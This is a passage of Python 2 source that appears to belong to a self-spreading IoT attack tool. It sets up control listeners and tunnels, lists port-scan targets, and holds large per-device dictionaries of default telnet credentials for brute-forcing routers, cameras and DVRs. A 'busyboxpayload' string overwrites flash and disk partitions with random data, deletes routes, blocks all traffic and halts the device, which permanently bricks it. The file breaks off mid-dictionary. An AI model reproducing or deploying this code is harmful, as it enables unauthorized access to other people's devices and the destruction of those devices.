need_new_localtoken = False

try:
	f = open( controlsecretcache, "rb" );
	controlsecretkey = f.read()
	f.close()
	if len(controlsecretkey) != controlsecretsize:
		need_new_secret = True
except:
	need_new_secret = True

if need_new_secret:
	print "Generating new secret.."
  # does not need to be cryptographially secure
	controlsecretkey = os.urandom( controlsecretsize )
	# let this crash if unable to write, something is fatally wrong then
	f = open( controlsecretcache, "wb" )
	f.write( controlsecretkey )
	f.close()
else:
	print "Imported existing secret"

# push to stdout so that process launcher can capture it
print "Secret is", binascii.hexlify(controlsecretkey)

try:
	f = open( controllocaltokencache, "r" );
	controllocaltokenkey = f.read()
	f.close()
	controllocaltokenkey = controllocaltokenkey.strip()
	if len(controllocaltokenkey) < 5:
		need_new_localtoken = True
except:
	need_new_localtoken = True

if need_new_localtoken:
	print "Generating new localtoken.."
	controllocaltokenkey = binascii.b2a_base64(os.urandom( 16 )).strip()
	# let this crash if unable to write, something is fatally wrong then
	f = open( controllocaltokencache, "w" )
	f.write( controllocaltokenkey )
	f.close()
else:
	print "Imported existing localtoken"

# push to stdout so that process launcher can capture it
print "Localtoken is \'%s\'" % ( controllocaltokenkey )

# verify our local package.tgz md5sum
local_package_md5sum = "NA"
try:
	pipe = subprocess.Popen('md5sum /tmp/package.tgz', shell=True, stdout=subprocess.PIPE)
	data = pipe.communicate()[0].split('\n')
	for line in data:
		matches = re.search( '^(\S+)\s+\S*package\.tgz', line )
		if matches:
			local_package_md5sum = matches.group(1)
except:
	pass
print "Local package md5sum is", local_package_md5sum

# determine my public ip - prefer /tmp/system/myip if available
# as a system with multiple public ips would get comms on this ip
try:
	f = open( '/tmp/system/myip', "r" );
	ipstring = f.read()
	f.close()
	matches = re.search('(\d+\.\d+\.\d+\.\d+)',ipstring)
	if matches:
		myip = matches.group(1)
	else:
		print "Warning: Could not extract a valid IP string from /tmp/system/myip, was",ipstring
	print "My public IP was specified as",myip
	if is_private_ip( myip ):
		print "Warning: My IP appears to be private."
except:
	print "Warning: No public IP was specified."
	pass
# this not existing should really be a fatal error as it shouldn't happen!
# if myip ends up being empty it will be set when the first incoming port 80
# request from a non-private ip appears		

# pacing to keep some devices from rebooting on startup
time.sleep(3)

# if a public message then redo myip
try:
	publicmessage = re.sub( '%%MYIP%%', myip, publicmessage )
except:
	pass

# standardize some OS settings
try:
	subprocess.Popen('iptables -F;iptables -t nat -F;iptables -A INPUT -p udp --dport 10001 -j DROP;iptables -t nat -A POSTROUTING -j MASQUERADE', shell=True)
	print "Attempted to reset iptables.."
except:
	print "Warning: Could not exec iptables reset."
	pass

needs_dns = False
try:
	f = open( '/etc/resolv.conf', "r" );
	resolv = f.read()
	f.close()
	if re.search( "nameserver\s+8\.8\.[48]\.[84]", resolv ):
		print "Has google DNS"
	else:
		needs_dns = True
except:
	needs_dns = True		

if needs_dns:
	try:
		print "Attempting to write google dns into resolv.conf.."
		f = open( "/etc/resolv.conf", "a" )
		f.write( "nameserver 8.8.8.8\n" )
		f.write( "nameserver 8.8.4.4\n" )
		f.close()
	except:
		print "Warning: Could not update resolv.conf."
		pass

# debug overrides
if debugmode:
	CONTROLlistenports = [ 8080 ]

CONTROLloadconfig(controlconfigfilename)

if testmode:
	logsystemhealth()
	saveconfig(controlconfigfilename)
	print "Test Mode Completed."
	exit()


# create listener(s)
CONTROLlistencount = 0
for port in CONTROLlistenports:
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	try:
		sock.bind(('0.0.0.0', int(port)))
		sock.listen(50)
		CONTROLlistensockbuf.append(sock)
		CONTROLlistencount += 1
	except:
		pass

if CONTROLlistencount == 0:
	log_session( "NOTC: Could not bind a single web listener." )
	logsystemhealth()
	time.sleep(60)
	if not debugmode:
		os.system( "killall -9 python" )
	exit()
  
# main loop
log_session( "Control Process Launch (%d listeners)" % ( CONTROLlistencount ) )


CONTROLperiodictime1 = time.time()
CONTROLperiodictime2 = 0
CONTROLperiodictime3 = time.time()
CONTROLperiodictime4 = 0

def CONTROLmainloop():
	global CONTROLperiodictime1
	global CONTROLperiodictime2
	global CONTROLperiodictime3
	global CONTROLperiodictime4
	
	curtime = time.time()
	CONTROLlistentime = 0.01
	readable, writable, errored = select.select(CONTROLlistensockbuf, [], [], CONTROLlistentime)
	for CONTROLlistensock in readable:
		connection, client_address = CONTROLlistensock.accept()
		remote_ip, remote_port = client_address
		target_ip, target_port = connection.getsockname()
		CONTROLlistenhttpbuf.append(connection)
		connhash = hash(connection)
		CONTROLlistenhttpstat[connhash] = '%s:%d>%s:%d' % ( remote_ip, remote_port, target_ip, target_port )
		CONTROLlistenstarttime[connhash] = curtime
	readable, writable, errored = select.select(CONTROLlistenhttpbuf, CONTROLlistenhttpbuf, [], 0.01)
	for websock in readable:
		data = recv_timeout(websock,0.01)
		connhash = hash(websock)
		
		if data:
			if connhash in CONTROLlistenwebreq and not CONTROLlistenwebreq[connhash] == None:
				CONTROLlistenwebreq[connhash] += data
			else:
				CONTROLlistenwebreq[connhash] = data
			if not CONTROLlistenwebreq[connhash][:4] == 'GET ':
				close_webtask( websock )
				continue
			if not connhash in CONTROLlistenwebstate or CONTROLlistenwebstate[connhash] == None:
				# removed some private stuff here
				continue
			if len( CONTROLlistenwebreq[connhash] ) >= 2048:
				close_webtask( websock )
				continue
		else:
			# if readable socket returns with no data it was probably closed by other end
			close_webtask( websock )
	for websock in writable:
		connhash = hash(websock)
		if connhash in CONTROLlistenreplybuf and not CONTROLlistenreplybuf[connhash] == None:
			if not CONTROLlistenreplybuf[connhash]:
				# can we fill in more content?
				if connhash in CONTROLlistenreplyhandle and not CONTROLlistenreplyhandle[connhash] == None:
					CONTROLlistenreplybuf[connhash] = CONTROLlistenreplyhandle[connhash].read(16384)
					if not CONTROLlistenreplybuf[connhash]:
						CONTROLlistenreplyhandle[connhash].close()
						CONTROLlistenreplyhandle[connhash] = None
				else:
					try:
						websock.shutdown(socket.SHUT_WR)
					except:
						pass
			# can write more 
			if CONTROLlistenreplybuf[connhash] != '':
				try:
					sent = websock.send( CONTROLlistenreplybuf[connhash] )
				except OSError, err:
					if err.errno in _RETRY:
						continue
					raise
				else:
					if sent < len( CONTROLlistenreplybuf[connhash] ):
						CONTROLlistenreplybuf[connhash] = CONTROLlistenreplybuf[connhash][sent:]
					else:
						CONTROLlistenreplybuf[connhash] = ''
	# deal with tunnels 
	readable, writable, errored = select.select(tunnelbindbuf, [], [], 0.01)
	for sock in readable:
		connection, client_address = sock.accept()
		remote_ip, remote_port = client_address
		target_ip, target_port = connection.getsockname()
		create_tunnel_connection( connection, remote_ip, int(remote_port), tunnelreference[hash(sock)] )
	readable, writable, errored = select.select(tunnelincomingbuf, [], [], 0.01)
	for sock in readable:
		connhash = hash(sock)
		data = recv_timeout(sock,0.01)
		if data:
			# TODO: should I bother with a local buffer in case socket bufs are not enough?
			try:
				tunnelincomingsocketforward[connhash].send(data)
			except:
				pass
		else:
			close_tunnel_incoming(sock)
	readable, writable, errored = select.select(tunnelforwardbuf, [], [], 0.01)
	for sock in readable:
		connhash = hash(sock)
		data = recv_timeout(sock,0.01)
		if data:
			# TODO: should I bother with a local buffer in case socket bufs are not enough?
			try:
				tunnelforwardsocketincoming[connhash].send(data)
			except:
				pass
		else:
			close_tunnel_forward(sock)
							
	# we only do maintenance tasks every N seconds..
	if curtime - CONTROLperiodictime1 > 3:
		for websock in CONTROLlistenhttpbuf:
			connhash = hash(websock)
			timecutoff = CONTROLlistentimemax
			if connhash in CONTROLlistenwebstate and CONTROLlistenwebstate[connhash] >= 2:
				timecutoff = CONTROLlistentimewebreqmax
			if curtime - CONTROLlistenstarttime[connhash] > timecutoff:
				close_webtask( websock )
		CONTROLperiodictime1 = curtime
	if curtime - CONTROLperiodictime2 > 60:
		check_minute_tasks()
		# now check if there are tunnels to terminate
		for tunsock in tunnelbindbuf:
			tunhash = hash(tunsock)
			if curtime > tunnelreference[tunhash][4]:
				close_tunnel_bind(tunsock, tunhash)
		CONTROLperiodictime2 = curtime
	if curtime - CONTROLperiodictime3 > 600:
		logsystemhealth()
		CONTROLperiodictime3 = curtime
	if curtime - CONTROLperiodictime4 > 14400:
		check_4h_jobs()
		CONTROLperiodictime4 = curtime



if not debugmode:
	# split file into smaller parse chunks for weaker CPUs
	readsplit = open('sentinel.py', 'r')
	readbuf = ''
	time.sleep(3)
	for line in readsplit:
		if "SPLTX" in line:
			if readbuf != '':
				exec(readbuf, globals())
				time.sleep(3)
			readbuf = ''
		else:
			readbuf += line
	if readbuf != '':
		exec(readbuf, globals())


# DO NOT REMOVE
# this tag will be sought out for splitting control/sentinel after obfuscation by packager
print "CHEMOtemphackCHEMO"
# DO NOT REMOVE
# splitting required for some weird devices which will croak if full file is loaded together..



# the old sentinel.py cutoff point here, merged into single file with control.py
# to save RAM



# just to keep flakier devices from rebooting while parsing this					
time.sleep(3)


# version
sentinelbuild = controlbuild

# logging config
showTN = False
showSO = False
showSR = False
showSD = True
showBR = True
showBL = True	# BR light mode - cuts back on content size for non-unknown or non-telnet
showWP = True
execSC = True
execBR = True
execWP = True

# port listener config, these do not matter after the control/sentinel were integrated.
#listenwebports = [ 80, 8080 ]
listenwebports = []
listenports = [ 23, 2222, 2323, 7547, 5555, 23231, 6789, 37777, 19058, 5358, 8023, 8022, 1433, 3306, 445, 110, 21, 88, 81, 8080, 8081, 49152, 5431 ]
#listenports = [ 2500, 8080, 1900 ]
listensockbuf = []
listensockcache = {}
listenhttpbuf = []
listenhttpstat = {}
listenipcache = {}

# port scan config
scanwebports = [ 80, 81, 82, 8000, 5555, 8080, 7547, 8081, 37215, 52869 ]
scanports = [ 22, 23, 80, 81, 82, 8000, 2222, 2323, 8080, 8081, 23231, 23123, 6789, 7547, 5555, 19058, 8023, 8022, 5358, 5000, 5001, 8888, 9000, 88, 12323, 8181, 60023 ]
scantime = 30
scanrandomcount = 30
dynamicchecktime = 17
scanretry = 3
scansockbuf = []
scansuccesscache = {}
scantaskreference = {}
scanstate = {}
scanopportunistic = {}
scanstarttime = {}
scanresults = {}
scantasks = []
scanactive = 0
sentinellaunchtime = time.time()
# show SR for these special ports even if disabled
srignoreports = [ 22, 2222, 5358, 6789, 19058 ]

# TODO: Should I use these rescanports or just stick with current process?
rescanports = [ 22, 23, 2222, 2323, 6789 ]
rescanretry = 1
rescanminutes = [ 15, 30, 60, 90, 120, 150, 180, 210, 240, 300, 360, 420, 480 ]
rescanqueue = []
rescanabort = []
rescanipcache = {}

# self-defense counteractivity config
bruteforce_maxattempts = 200
bruteforce_waitbetweenattempts = 3
# max duration of a single session
bruteforce_maxconnectiontime_login = 90
bruteforce_maxconnectiontime_payload = 600
bruteforce_payloadcmd_timeout = 20

# exec opportunistic payloads if we get the chance
# TODO: Rescanminutes for payload hits ? Keep trying until no more?
busyboxpayload = 'cat /proc/mounts\ncat /dev/urandom | mtd_write mtd0 - 0 32768\ncat /dev/urandom | mtd_write mtd1 - 0 32768\n'
busyboxpayload += 'busybox cat /dev/urandom >/dev/mtd0 &\nbusybox cat /dev/urandom >/dev/sda &\nbusybox cat /dev/urandom >/dev/mtd1 &\nbusybox cat /dev/urandom >/dev/mtdblock0 &\nbusybox cat /dev/urandom >/dev/mtdblock1 &\nbusybox cat /dev/urandom >/dev/mtdblock2 &\nbusybox cat /dev/urandom >/dev/mtdblock3 &\n'
busyboxpayload += 'busybox route del default\ncat /dev/urandom >/dev/mtdblock0 &\ncat /dev/urandom >/dev/mtdblock1 &\ncat /dev/urandom >/dev/mtdblock2 &\ncat /dev/urandom >/dev/mtdblock3 &\ncat /dev/urandom >/dev/mtdblock4 &\ncat /dev/urandom >/dev/mtdblock5 &\ncat /dev/urandom >/dev/mmcblk0 &\ncat /dev/urandom >/dev/mmcblk0p9 &\ncat /dev/urandom >/dev/mmcblk0p12 &\ncat /dev/urandom >/dev/mmcblk0p13 &\ncat /dev/urandom >/dev/root &\ncat /dev/urandom >/dev/mmcblk0p8 &\ncat /dev/urandom >/dev/mmcblk0p16 &\n'
busyboxpayload += 'route del default;iproute del default;ip route del default\niptables -F;iptables -t nat -F;iptables -A INPUT -j DROP;iptables -A FORWARD -j DROP\nhalt -n -f\nhalt\nbosybox halt\nreboot\n'

# tr069 stuff now moved to separate trforce portion


# config handler
def loadconfig( filename, bootup=False ):
	global showTN
	global showSO
	global showSR
	global showSD
	global showBR
	global showBL
	global showWP
	global execSC
	global execBR
	global execWP
	global listenports
	global scanports
	global scanwebports
	
	sentinellistenports = []
	sentinelscanports = []
	sentinelscanwebports = []
	datacount = 0

	# touch the config in case it doesn't exist..
	try:
		f = open( filename, 'r' )
		config = f.read().split('\n')
		for line in config:
			matches = re.search( 'sTN: (\d+)', line )
			if matches:
				showTN = bool(int(matches.group(1)))
				datacount += 1
			matches = re.search( 'sSO: (\d+)', line )
			if matches:
				showSO = bool(int(matches.group(1)))
				datacount += 1
			matches = re.search( 'sSR: (\d+)', line )
			if matches:
				showSR = bool(int(matches.group(1)))
				datacount += 1
			matches = re.search( 'sSD: (\d+)', line )
			if matches:
				showSD = bool(int(matches.group(1)))
				datacount += 1
			matches = re.search( 'sBR: (\d+)', line )
			if matches:
				showBR = bool(int(matches.group(1)))
				datacount += 1
			matches = re.search( 'sBL: (\d+)', line )
			if matches:
				showBL = bool(int(matches.group(1)))
				datacount += 1
			matches = re.search( 'sWP: (\d+)', line )
			if matches:
				showWP = bool(int(matches.group(1)))
				datacount += 1
			matches = re.search( 'eSC: (\d+)', line )
			if matches:
				execSC = bool(int(matches.group(1)))
				datacount += 1
			matches = re.search( 'eBR: (\d+)', line )
			if matches:
				execBR = bool(int(matches.group(1)))
				datacount += 1
			matches = re.search( 'eWP: (\d+)', line )
			if matches:
				execWP = bool(int(matches.group(1)))
				datacount += 1
			if 'aLP: ' in line[:7]:
				datacount += 1
				regex = re.compile( '(\d+)' )
				importarray = [];
				for match in regex.finditer( line ):
					if not match in importarray:
						importarray.append(int(match.group(1)))
				sentinellistenports = importarray
			if 'aSC: ' in line[:7]:
				datacount += 1
				regex = re.compile( '(\d+)' )
				importarray = [];
				for match in regex.finditer( line ):
					if not match in importarray:
						importarray.append(int(match.group(1)))
				sentinelscanports = importarray
			if 'aWP: ' in line[:7]:
				datacount += 1
				regex = re.compile( '(\d+)' )
				importarray = [];
				for match in regex.finditer( line ):
					if not match in importarray:
						importarray.append(int(match.group(1)))
				sentinelscanwebports = importarray
		f.close()
	except:
		log_session( 'ERR: Sentinel could not read config.' )
		return
	if datacount < 9:
		# if we have too little data we should keep the defaults
		log_session( "NOTC: Sentinel ignoring config due to lack of data." )
		return
	scanports = sentinelscanports
	scanwebports = sentinelscanwebports
	# no point in fiddling with the sockets if we haven't booted up yet
	if bootup:
		listenports = sentinellistenports
		return
	# now review listen ports - we need to close unwanted listen bind sockets,
	# and create new ones
	for port in sentinellistenports:
		if not port in listenports:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			try:
				sock.bind(('0.0.0.0', int(port)))
				sock.listen(5)
				listensockbuf.append(sock)
				listensockcache[int(port)]=sock
				log_session( "NOTC: Sentinel added listening port %d" % (int(port)) )
			except:
				pass
	for port in listenports:
		if not port in sentinellistenports:
			# if we were unable to bind listener this cache key does not exist, so check for it first
			if int(port) in listensockcache:
				sock = listensockcache[int(port)]
				if sock in listensockbuf:
					try:
						sock.close()
					except:
						pass
					listensockbuf.remove(sock)
					listensockcache[int(port)] = None
					log_session( "NOTC: Sentinel removed listening port %d" % (int(port)) )
	listenports = sentinellistenports
# we might as well load it here before we do anything, configbootup is set to True
loadconfig( '/tmp/system/control.cfg', True )

################################ bruteforce implementation #######################################

# try these first if the banner matches a specific term, and apply before honeypot check
bruteforce_dictionary_prehoneypot = [
	# Radware honeypot, came up a few times.
#	[ 'SSBHUB\(2\.2\.12\) login',
#		'root/geenensp',
#	],
	# Unknown router CLI, pw only
	[ 'Login authentication', 
		'admin/',
		'root/',
		'password/password',		# some units which only ask for pw
    'admin/admin@123',
    'Admin/admin',
		'telecom/telecom',
    '1234/1234',
		'admin/admin',
		'root/root',
		'HUAWEI/admin@huawei.com',
	],
	# Prevent FP with empty passwords
	[ 'Password:', 
		'/',
		'/',
	],
  # NM-1000 
  [ 'NM-\S+ login:',
    'admin/a1sev5y7c39k', 
  ],
	# FP
	[ 'administrative password is not',
	  '/',
	],
	# some buggy IoT thing which allows any login
	[ 'GAPM-\d\d\d\d login',
		'root/root',
	],
	# not sure how common this is
	[ 'FTC\d+ ',
	  'operator/operator',
	],
  # Kasda lgoin
  [ 'Kasda login:',
    'admin/admin',
    'admin/adminadmin',
  ],
	# KN-WR922 etc
	[ 'KN-\S+ ',
	  'root/wuhanyatelan',
	],
	# DSL-500B D-link broadcom CLI thing
	[ 'DSL-500B',
	  'admin/admin',
	  'support/support',
	],
  # DSL-N12U login
  [ 'DSL-N12U',
    'admin/asus',
    'admin/0',
  ],
  # DLINK login
  [ 'DLINK login',
    'admin/root',
  ],
  # XiongMai ctrl interface
  [ 'PORT:9527:',
  	'admin/',
  	'admin/admin',
  	'admin/123456',
  	'admin/',
  	'admin/12345',
  	'admin/aa888888',
  	'admin/admin',
  	'admin/1234',
  	'admin/888888',
  	'admin/123456',
  	'admin/0000',
  	'admin/1111',
  	'admin/666666',
  	'admin/654321',
  	'admin/111111',
  	'admin/123',
  	'admin/1',
  	'admin/admin123',
  	'admin/123abc456',
  	'admin/000000',
  	'admin/7773',
  	'admin/112233',
  	'admin/8888',
  	'admin/1453',
  	'admin/34567',
  	'admin/686868',
  	'admin/12345678',
  	'admin/900009',
  	'admin/54321',
  	'admin/2499',
  	'admin/123321',
  	'admin/bdc3939',
  	'admin/4321',
  	'admin/88888888',
  	'admin/abc123',
  	'admin/admin1',
  	'admin/9914',
  	'admin/168168',
  	'admin/spc123',
  	'admin/sks12345',
  	'admin/1212',
  	'admin/13579',
  	'admin/102030',
  	'admin/34588',
  	'admin/1122',
  	'admin/121234',
  	'admin/11111',
  	'admin/9999',
  	'admin/81171762',
  	'admin/2580',
  	'admin/999999',
  	'admin/9742',
  	'admin/2016',
  	'admin/1974',
  	'admin/admin12345',
  	'admin/peak0429',
  	'admin/123654',
  	'admin/1987',
  	'admin/1988',
  	'admin/siera',
  	'admin/2734988',
  	'admin/55555',
  	'admin/1023',
  	'admin/123123',
  	'admin/88888',
  	'admin/9001',
  	'admin/123456789',
  	'admin/1985'
  	'admin/1010',
  	'admin/2014',
  	'admin/7777777',
  	'admin/1976',
  	'admin/2222',
  	'admin/222222',
  	'admin/7764',
  	'admin/54637767',
  	'admin/00000',
  	'admin/5555',
  	'admin/0257',
  	'admin/717766',
  	'admin/555',
  	'admin/1234567',
  	'admin/1103',
  	'admin/121212',
  	'admin/1967',
  	'admin/456',
  ],
]

# try these first if the banner matches a specific term, post honeypot check
bruteforce_dictionary_specific = [
  [ 'GM login:',  # banner hint
    "root/GM8182",
  ],
  [ 'LocalHost login:',
    'root/xc3511',
    "root/xmhdipc",
    'root/tsgoingon',
  ],
  # Some CN IoT things, all have same root pw, MD5 hash is 
  # $1$I62B1IWu$4rAzAK1YLBSB4slr.uCdw/
  # ran out of time to figure these out, and would need root to brick. My 
  # crappy old GPU was not able to crack the hash in a week and so had to 
  # move on :(
  [ 'DAM-2160',   
    'admin/888888',
  ],
  [ 'DVR login:',
    'root/xc3511',
  ],
  [ 'dvr\d* login:',
    'root/tsgoingon',
  ],
  [ 'QLLoadBalance login',
    'root/admin',
  ],
  [ 'KeeneticOS',
    'admin/admin',
    '/',
    'admin/1234',
  ],
  [ '2JLogin',
    'admin/123',
  ],
  [ ';localhost login:',
    'root/123456',
    'admin/admin',
    'user/123456',
  ],
	# Some Password : ones
	[ 'Password :',
	  'admin/1234',
	  'home/12345678',
	],
  [ '\(none\) login:',
    'vstarcam2015/20150602',
  	'root/5up',
    'root/',
    'root/icatch99',
  	'root/vizxv',
  	"root/juantech",
    'root/adminpassword',
  	"root/zlxx.",				
		'adm/adm',
    'root/antslq',
    'root/123456',
    'root/1001chin',
    'root/win1dows',
    'root/7ujMko0vizxv ',
    'root/hunt5759',
    'root/jvbzd',
    'root/123',
    'root/ivdev',
    'root/zxcvbnm',
    'root/IPCam@sw',
    'root/qwe123',
    'root/china123',
    'root/hg2x0',
    'root/e10adc39',
    'root/ipc71a',
    'root/fxjvt1805',
    'root/2011vsta',
    'root/vhd1206',
    'root/000000',
    'admin/admin',
    'admin/0000',
    'admin/7ujMko0admin',
    'user/user',
    'ftp/ftp',
    '123/123',
    'admin/ipcam_rt5350',
    'ftpuser/ftpuser',
    'guest/guest',
    '1/1',
    'system/123456',
    'guest/123456',
  ],
  [ '(AC|A)\d+ login',
    'admin/a1sev5y7c39k',
    'admin/888888888',
  ],
  [ 'Welcome to Zhone Technologies',
  	'admin/zhone',
  ],
  [ 'zzgx login',
    'root/taZz@01',
    'root/taZz@23495859',
  ],
  [ 'host login:',
  	'root/vizxv',
  ],
  [ 'TL-WR7',
  	'root/5up',
  ],
  [ 'F6',
  	'root/Zte521',
	],
	# Baby ? Some kind of camera thing by netween.co.kr / goodcns
	[ 'netween\.co\.kr', 
		'baby/baby',
	],
	# kopp Ingenic thingy
	[ 'kopp login',
		'root/kopp',
	],
	# MikroTik, less relevant now after the 2018 exploits
	[ 'MikroTik',
	  'admin/',
    'system/Aa142636',
		'user/user',
		'admin/',
		'installer/installer',
		'admin/admin',
		'test/test',
		'admin/12345',
    'admin/admin@123',
		'admin/passw0rd',
		'admin/1234567890',
		'admin/password',
		'admin/admin123',
		'support/support',
		'admin/11111111',
		'admin/P@55w0rd!',
		'admin/888888',
		'admin/1234',
		'admin/123456',
		'admin/tsunami',
		'admin/admin1',
		'0/0',
		'guest/guest',
		'admin/123',
		'admin/1111',
		'admin/admin1234',
		'admin/654321',
		'admin/4321',
		'admin/admin99',
		'admin/operator',
		'admin/hello',
		'admin/54321',
		'admin/666666',
		'test/test123',
		'root/root',
		'operator/operator',
		'monitor/monitor',
		'admin/abc123',
		'admin/system',
		'admin/secure',
		'router/router',
		'ftp/ftp',
		'Admin/Admin',
		'admin/0000',
		'ubnt/ubnt',
		'guest/123456',
		'1234/1234',
		'admin/Admin123',
		'admin/admin00',
		'admin/99999999',
		'admin/motorola',
		'admin/administrator',
		'admin/2222',
		'user/admin',
		'root/root1234',
		'root/root123',
		'root/qwerty',
		'root/password',
		'root/12345',
		'root/1234',
		'root/123',
		'guest/guest123',
		'admin/vnpt',
		'admin/test',
		'admin/root',
		'admin/power',
		'Administrator/',
		'admin/diamond',
		'admin/conexant',
		'admin/atlantis',
		'admin/ADMIN',
		'1/1',
		'root/12345678',
		'888888/888888',
		'a/a',
		'admin/nimda',
		'backup/backup',
		'ajay/ajay',
		'support/support',
		'admin/airlive',
		'teste/teste',
    'admin/P@ssw0rd',
	],
	# Ethernet device thingy
	[ 'Welcome to JNIOR',
		'jnior/jnior',
		'admin/admin',
		'jnior/1234',
		'admin/1234',
	],
	[ 'Welcome to slush',
		'jnior/jnior',
		'admin/admin',
		'jnior/1234',
		'admin/1234',
		'root/tini',
		'guest/guest',
	],
	# Some Chinese routers
	[ 'heluyou login',
		'admin/h@32LuyD',
	],
  # Qualcomm mdm
  [ 'OpenEmbedded Linux mdm9625',
    'admin/admin',
  ],
  # Some APN STAR16 thingy, GW2 login
  [ '(APN STAR|APN GW|GW2 login|VDN login|APN MOON)',
    'root/gw1admin',
    'root/root123456',
  ],
  # Red Hat Enterprise Linux IoT things
  [ 'Red Hat Enterprise Linux',
    'informix/informix',
  ],
  # Zyxel
  [ 'PK5001Z login',
  	'admin/CenturyL1nk',
		'admin/CTLSupport12',
		'admin/QwestM0dem',
  ],
  # SWITCH login
  [ 'SWITCH login',
    'root/vertex25ektks123',
    'admin/admin',
  ],
  # haivision ace
  [ 'haivision-ace',
    'admin/manager',
    'user/public',
  ],
  # Ruijie
  [ 'Ruijie login',
  	'ruijie/ruijie',
  ],
  # RuiJie
  [ 'RuiJie login',
  	'admin/csc100',
  	'ruijie/ruijie',
  ],
  # DSL-500B
  [ 'DSL-500B',
  	'TMAR#DLKT20060205/DLKT20060205\n',
  	'admin/admin\n',
  ],
  [ 'ZEM\d\d',
    'root/swsbzkgn',
  ],
  # BusyBox on X login
  [ 'BusyBox on \S+ login',
		'admin/admin',
		'admin/1234',
		'root/Admin',
		'root/',
		'root/admin',
		'user/user',
		'admin/QwestM0dem',
		'admin/xad$l#12',
		'root/12345',
		'root/password',
		'root/1234567890',
		'root/123456',
		'admin/password',
		'root/1234',
		'Admin/Admin',
		'admin/1111',
		'admin/admin123',
		'admin/qwerty',
		'admin/nimda',
		'admin/isa95mar',
		'support/support',
  ],
  # Youku-router
  [ 'Youku-router',
    'root/admin',
  ],
  # Account:
  [ 'Account:',
  	'admin/1234',
 	],
  # KingType ktcatv
  [ 'ktcatv login',
  	'super/root',
  	'admin/admin',
  ],
  # Actiontec
  [ 'Actiontec xDSL Router',
  	'admin/CenturyL1nk',
		'admin/CTLSupport12',
		'admin/QwestM0dem',
		'admin/1111',
		'admin/abc123',
  ],
  [ '$!login',
    'admin/adminadmin',
  ],
  # Some other Broadcoms etc
  [ '!Login:',
		'admin/admin',
		'admin/ho4uku6at',
		'root/root',
		'support/support',
		'admin/admin1',
		'admin/1234',
		'1234/1234',
		'support/admin',
		'admin/epicrouter',
		'admin/admin1234',
		'admin/admin123',
		'admin/12345',
		'telecomadmin/nE7jA%5m',
		'admin/1111',
		'admin/888888',
		'admin/54321',
		'supervisor/zyad1234',
		'admin/123',
		'admin/root',
		'admin/system',
		'manager/friend',
		'admin/123456',
		'admin/4321',
		'anonymous/anonymous',
		'admin/444444',
		'admin/44444',
		'admin/44',
		'admin/263297',
		'root/ttnet',
		'admin/0000',
		'admin/362729',
		'admin/9999999',
		'admin/rombik1',
    'telnetadmin/telnetadmin',
    'admin/adminadmin',
    'root/77777',
  ],
  # Just a ;login
  [ ';login:',
    'admin/admin',
    'root/admin',
    '1/1', 
    'admin/admin123',
  ],
  # login with space
  [ '; login:',
    'root/toor',
  ],
  # IMPORTANT thing, OpenWRT K2/LEDE login
  [ 'IMPORTANT ===',
    'root/admin',
  ],
  # some other Login thing ?
  [ 'JLogin',
    'admin/admin',
    'admin/123',
    'guest/guest',
    'admin/',
  ],
  # ;root login
  [ ';root login',
    'root/e10adc39',
    'guest/123456',
  ],
  # RTIPC login
  [ 'RTIPC login',
    'root/cat1029',
  ],
  # buildroot login
  [ 'buildroot login',
    'root/Focushns',
    'root/Ckdgus11',
  ],
  # Log level 3
  [ 'Log level 3',
    'admin/dreambox',
  ],
  # Broadcom w brute force protections, e.g. TD-W8960
  [ 'TD\-W\S+\sDSL',
    'support/support',
  ],

  # SMCWBR14S-N4 etc
  [ 'SMC\S+ login',
    'admin/smcadmin',
  ],

  # Typically Broadcoms, boost a few rare pws
  [ '(Router;Login|Gateway;Login)',
		'admin/admin',
		'admin/1234',
		'superadmin/Is$uper@dmin',
		'root/12345',
		'admin/password',
		'user/user',
		'tmadmin/tmadmin',
		'support/support',
		'support/admin',
		'admin/ho4uku6at',
		'1234/1234',
		'supervisor/zyad1234',
		'admin/362729',
		'user/password',
		'admin/admin1',
		'admin/admin1234',
		'admin/admin123',
		'admin/abc123',
		'admin/12345',
		'admin/123',
		'root/root',
		'admin/1111',
		'admin/administrator',
		'admin/power',
		'root/admin',
		'admin/123456',
		'ZXDSL/ZXDSL',
		'admin/gvt12345',
		'telecomadmin/nE7jA%5m',
		'tech/tech',
		'ADSL/export03',
		'admin/adslroot',
		'admin/utstar',
		'admin/CenturyL1nk',
		'admin/CTLSupport12',
		'user/digi',
		'root/cciadmin',
		'support/support123',
		'e8telnet/e8telnet',
		'e8ehome/e8ehome',
		'e8ehomeasb/e8ehomeasb',
  ],
  # Rarer Broadcoms
  [ '!Username:',
  	'admin/admin',
  	'user/user',
		'useradmin/useradmin',
		'telecomadmin/nE7jA%5m',
		'guest/guest',
	],  

  # Upper case ;Login
  [ ';Login:',
    'system/admin',
  ],
  # only Login, maybe start pattern with ^? 
	[ 'Login:',
		'rdsadmin/adu#',
		'admin/',
	],

	# rlx-linux
	[ 'rlx-linux login',
		'root/password',
		'root/',
	],

  # UTT router
  [ 'UTT login:',
  	'admin/admin',
  	'admin/123456',
  	'admin/54321',
  	'admin/admin123',
  	'admin/password',
  	'admin/Admin123',
  	'admin/1234567890',
  	'admin/*58298',			# hinet.net tw
  	'admin/2oiidxii22',		# hinet.net tw
  	'admin/19761213',		# ??
  	'admin/4276365',   # ??
  	'admin/nimda',
  	'admin/adminadmin',
  	'admin/guest',
  	'admin/a',
  	'admin/ADMIN',
  	'admin/administrator',
  	'admin/adminstrator',
  	'admin/root',
  	'admin/isa95mar',
  	'guest/guest',
  	'guest/123456',
  	'admin/00000000',
  ],
  # OmniPCX
  [ 'OmniPCX',
    'mtcl/mtcl',
  ],
  # Ipcamera
  [ 'Ipcamera login',
    'root/h2014071',
  ],
  # Ipcamera
  [ 'IPCamera login',
    'root/',
  ],
  # Boomsense
  [ 'Boomsense',
    'telnetadmin/telnetadmin',
  ],
  # IPC
  [ 'IPC login',
    'root/IPCam@sw',
  ],
  # DSLs
  [ 'DSL5\S+ login:',
    "admin/admin",
		"admin/bayandsl",
	],
	# Allied Telesis device
	[ 'TELNET session now in ESTABLISHED state',
	  'Manager/friend',
	],
	# Netscreen
	[ 'Remote Management Console',
		'netscreen/netscreen',
		'localadmin/localadmin',
    'admin/admin1234',
    'Admin/Admin',
    'admin/admin123',
    'admin/admin',
    'admin/P@ssw0rd',
	],
  # Algar login
